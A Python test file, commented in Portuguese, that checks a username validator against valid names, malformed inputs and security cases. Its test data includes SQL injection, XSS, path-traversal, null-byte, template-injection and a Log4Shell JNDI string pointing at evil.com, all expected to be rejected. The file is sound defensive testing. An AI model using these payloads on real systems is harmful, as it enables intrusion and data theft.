"""
Testes para a função de validação de username.
Este arquivo demonstra casos de uso válidos e inválidos da validação.
"""

import sys
import os

# Adicionar o diretório raiz ao path para importar módulos
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from src.routes.user import validate_username


def test_valid_usernames():
    """Testa usernames válidos"""
    print("=" * 60)
    print("TESTANDO USERNAMES VÁLIDOS")
    print("=" * 60)
    
    valid_cases = [
        "usuario123",
        "joao_silva",
        "Maria123",
        "user_name_123",
        "abc",  # mínimo 3 caracteres
        "a" * 30,  # máximo 30 caracteres
        "User123_test",
        "validUser_2024",
    ]
    
    for username in valid_cases:
        is_valid, error = validate_username(username)
        status = "✓ PASS" if is_valid else "✗ FAIL"
        print(f"{status}: '{username}'")
        if not is_valid:
            print(f"      Erro: {error}")
    print()


def test_invalid_usernames():
    """Testa usernames inválidos"""
    print("=" * 60)
    print("TESTANDO USERNAMES INVÁLIDOS")
    print("=" * 60)
    
    invalid_cases = [
        ("user@123", "contém @"),
        ("user.name", "contém ."),
        ("user-name", "contém -"),
        ("user name", "contém espaço"),
        ("user#123", "contém #"),
        ("user$money", "contém $"),
        ("user!!", "contém !"),
        ("user<script>", "contém < e >"),
        ("user'OR'1'='1", "tentativa de SQL injection"),
        ("../../admin", "tentativa de path traversal"),
        ("ab", "muito curto - 2 caracteres"),
        ("a" * 31, "muito longo - 31 caracteres"),
        ("123user", "começa com número"),
        ("_user", "começa com underscore"),
        ("user_", "termina com underscore"),
        ("user__name", "underscores consecutivos"),
        ("", "vazio"),
        ("   ", "apenas espaços"),
        ("josé", "caractere acentuado"),
        ("user中文", "caracteres unicode"),
        ("user\nname", "contém quebra de linha"),
        ("user\tname", "contém tab"),
        ("user;DROP TABLE users;", "tentativa de SQL injection"),
        ("user<img src=x onerror=alert(1)>", "tentativa de XSS"),
    ]
    
    for username, reason in invalid_cases:
        is_valid, error = validate_username(username)
        status = "✓ PASS" if not is_valid else "✗ FAIL"
        
        # Truncar username longo para exibição
        display_username = username if len(username) <= 30 else username[:27] + "..."
        
        print(f"{status}: '{display_username}'")
        print(f"      Razão: {reason}")
        print(f"      Erro retornado: {error}")
        print()


def test_edge_cases():
    """Testa casos extremos e especiais"""
    print("=" * 60)
    print("TESTANDO CASOS EXTREMOS")
    print("=" * 60)
    
    edge_cases = [
        (None, "valor None"),
        (123, "valor numérico ao invés de string"),
        (["user"], "lista ao invés de string"),
        ({"user": "name"}, "dicionário ao invés de string"),
        ("  valid_user  ", "username válido com espaços nas bordas"),
    ]
    
    for username, description in edge_cases:
        is_valid, error = validate_username(username)
        status = "✓ PASS" if not is_valid else "✗ FAIL"
        print(f"{status}: {description}")
        print(f"      Entrada: {repr(username)}")
        print(f"      Válido: {is_valid}")
        print(f"      Erro: {error}")
        print()


def test_security_scenarios():
    """Testa cenários de segurança comuns"""
    print("=" * 60)
    print("TESTANDO CENÁRIOS DE SEGURANÇA")
    print("=" * 60)
    
    security_cases = [
        ("admin", "username 'admin' simples - VÁLIDO"),
        ("root", "username 'root' simples - VÁLIDO"),
        ("administrator", "username 'administrator' - VÁLIDO"),
        ("admin' OR '1'='1", "SQL injection clássico - INVÁLIDO"),
        ("admin'--", "SQL injection com comentário - INVÁLIDO"),
        ("admin/**/OR/**/1=1", "SQL injection com comentário - INVÁLIDO"),
        ("<script>alert('xss')</script>", "XSS básico - INVÁLIDO"),
        ("javascript:alert(1)", "XSS com javascript: - INVÁLIDO"),
        ("../../../etc/passwd", "Path traversal - INVÁLIDO"),
        ("..\\..\\..\\windows\\system32", "Path traversal Windows - INVÁLIDO"),
        ("%00admin", "Null byte injection - INVÁLIDO"),
        ("admin%00", "Null byte no final - INVÁLIDO"),
        ("${jndi:ldap://evil.com}", "Log4Shell pattern - INVÁLIDO"),
        ("user{{7*7}}", "Template injection - INVÁLIDO"),
    ]
    
    for username, description in security_cases:
        is_valid, error = validate_username(username)
        expected = "VÁLIDO" in description
        status = "✓ PASS" if is_valid == expected else "✗ FAIL"
        
        display_username = username if len(username) <= 30 else username[:27] + "..."
        
        print(f"{status}: {description}")
        print(f"      Username: '{display_username}'")
        print(f"      Válido: {is_valid}, Esperado: {expected}")
        if error:
            print(f"      Erro: {error}")
        print()


def main():
    """Executa todos os testes"""
    print("\n")
    print("╔" + "=" * 58 + "╗")
    print("║" + " " * 10 + "TESTES DE VALIDAÇÃO DE USERNAME" + " " * 16 + "║")
    print("╚" + "=" * 58 + "╝")
    print("\n")
    
    test_valid_usernames()
    test_invalid_usernames()
    test_edge_cases()
    test_security_scenarios()
    
    print("=" * 60)
    print("TESTES CONCLUÍDOS")
    print("=" * 60)
    print("\nA função validate_username() usa uma lista branca (whitelist)")
    print("que permite APENAS caracteres alfanuméricos e underscore.")
    print("\nEsta abordagem protege contra:")
    print("  ✓ SQL Injection")
    print("  ✓ XSS (Cross-Site Scripting)")
    print("  ✓ Path Traversal")
    print("  ✓ Caracteres especiais maliciosos")
    print("  ✓ Template Injection")
    print("  ✓ Command Injection")
    print()


if __name__ == "__main__":
    main()
